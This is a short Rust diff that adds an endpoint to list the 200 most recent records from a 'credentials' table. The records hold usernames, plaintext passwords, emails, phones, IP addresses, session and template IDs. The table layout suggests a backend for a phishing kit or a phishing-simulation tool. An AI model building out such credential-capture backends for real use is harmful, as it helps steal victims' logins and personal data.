@@ -366,3 +366,28 @@ pub async fn delete_session(
         .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
     Ok(StatusCode::NO_CONTENT)
 }
+
+#[derive(Serialize)]
+pub struct CredentialRow {
+    id: String,
+    session_id: String,
+    template_id: Option<String>,
+    username: Option<String>,
+    password: Option<String>,
+    email: Option<String>,
+    phone: Option<String>,
+    ip_address: Option<String>,
+    created_at: i64,
+}
+
+pub async fn list_credentials(State(state): State<Arc<AppState>>) -> Result<Json<Vec<CredentialRow>>, StatusCode> {
+    let rows: Vec<(String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)> = sqlx::query_as(
+        "SELECT id, session_id, template_id, username, password, email, phone, ip_address, created_at FROM credentials ORDER BY created_at DESC LIMIT 200"
+    ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    let creds: Vec<CredentialRow> = rows.into_iter().map(|(id, session_id, template_id, username, password, email, phone, ip_address, created_at)| {
+        CredentialRow { id, session_id, template_id, username, password, email, phone, ip_address, created_at }
+    }).collect();
+
+    Ok(Json(creds))
+}
